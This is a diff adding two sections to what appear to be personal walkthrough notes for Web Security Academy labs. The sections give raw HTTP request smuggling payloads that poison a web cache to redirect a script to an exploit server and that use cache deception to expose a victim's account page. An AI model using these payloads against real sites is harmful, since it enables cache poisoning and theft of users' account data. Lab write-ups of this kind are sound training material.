@@ -298,3 +298,46 @@ Content-Length: 10
 
 x=1
 ```
+
+### Exploiting HTTP request smuggling to perform web cache poisoning
+Setup the poison request:
+```
+POST / HTTP/1.1
+Host: ac891f541f1ede2c80b356d0007a0090.web-security-academy.net
+Content-Length: 177
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=zY91vjxzDBEbrxMtpRfAP5D2ExB7mdOG
+
+0
+
+GET /post/next?postId=3 HTTP/1.1
+Host: ac361f2a1fc9deb68076563e01340012.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+y=
+```
+
+Poison the cache by calling https://ac891f541f1ede2c80b356d0007a0090.web-security-academy.net/resources/js/tracking.js
+
+You should get redirect to exploit server.
+
+### Exploiting HTTP request smuggling to perform web cache deception
+Setup the poison request:
+```
+POST / HTTP/1.1
+Host: ac9d1f341e9a424c80db6c4b00130068.web-security-academy.net
+Cookie: session=n6qQ6HBFOCVjk7Knrwv3pLbnvB3M6KvC
+Transfer-Encoding: chunked
+Content-Length: 39
+
+0
+
+GET /my-account HTTP/1.1
+X-Foo: x
+```
+
+Deceive the cache by calling https://ac9d1f341e9a424c80db6c4b00130068.web-security-academy.net/resources/js/tracking.js
+
+You should get the victim's account detail now.
